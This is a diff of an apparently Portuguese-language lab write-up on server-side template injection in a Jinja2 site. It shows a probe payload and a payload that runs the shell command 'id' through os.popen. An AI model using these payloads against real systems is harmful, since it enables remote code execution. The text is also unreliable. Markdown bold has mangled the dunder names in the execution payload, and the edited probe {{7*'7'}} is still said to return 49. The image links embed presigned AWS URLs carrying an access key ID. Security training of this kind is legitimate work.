@@ -26,7 +26,11 @@ Para validar se a aplicação web é vulnerável a SSTI, é necessário informar
 
 ![https://s3.us-west-2.amazonaws.com/secure.notion-static.com/1509631d-66d0-41d8-a5f5-6cdbb7535b50/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210123%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210123T031641Z&X-Amz-Expires=86400&X-Amz-Signature=c4b6c62d750b3f91330fe57e02b9343044128345c0b1f905069297d7e6410534&X-Amz-SignedHeaders=host&response-content-disposition=filename %3D"Untitled.png"](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/1509631d-66d0-41d8-a5f5-6cdbb7535b50/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210123%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210123T031641Z&X-Amz-Expires=86400&X-Amz-Signature=c4b6c62d750b3f91330fe57e02b9343044128345c0b1f905069297d7e6410534&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)
 
-Por se tratar de um site feito em Jinja2, basta validar se o payload `{{7*7}}` retorna o resultado 49.
+Por se tratar de um site feito em Jinja2, basta injetar o payload e validar se a aplicação retorna o resultado 49.
+Payload usado:
+```bash
+{{7*'7'}}
+```
 
 ![https://s3.us-west-2.amazonaws.com/secure.notion-static.com/4ad33801-8d3b-4b35-af51-f8b26c6a3b9e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210123%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210123T031645Z&X-Amz-Expires=86400&X-Amz-Signature=f09a5e727d86a6fda4bba24b345d9e321598cabb9d81dd2663aae715fdcaeb1b&X-Amz-SignedHeaders=host&response-content-disposition=filename %3D"Untitled.png"](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/4ad33801-8d3b-4b35-af51-f8b26c6a3b9e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210123%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210123T031645Z&X-Amz-Expires=86400&X-Amz-Signature=f09a5e727d86a6fda4bba24b345d9e321598cabb9d81dd2663aae715fdcaeb1b&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)
 
@@ -38,7 +42,10 @@ Após validar que a aplicação é vulnerável, basta usar o payload correto ref
 
 [SSTI Jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
 
-Payload Usado: `{{request.application.**globals**.**builtins**.**import**('os').popen('id').read()}}`
+Payload Usado: 
+```bash
+{{request.application.**globals**.**builtins**.**import**('os').popen('id').read()}}`
+```
 
 ![https://s3.us-west-2.amazonaws.com/secure.notion-static.com/2095fd0b-81ae-4057-94c7-3baacefb116e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210123%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210123T031647Z&X-Amz-Expires=86400&X-Amz-Signature=20a4e712291ccfc84ff41b876839d448506fa120c4cdc9094d64e43ecfd5a04e&X-Amz-SignedHeaders=host&response-content-disposition=filename %3D"Untitled.png"](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/2095fd0b-81ae-4057-94c7-3baacefb116e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210123%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210123T031647Z&X-Amz-Expires=86400&X-Amz-Signature=20a4e712291ccfc84ff41b876839d448506fa120c4cdc9094d64e43ecfd5a04e&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)
 
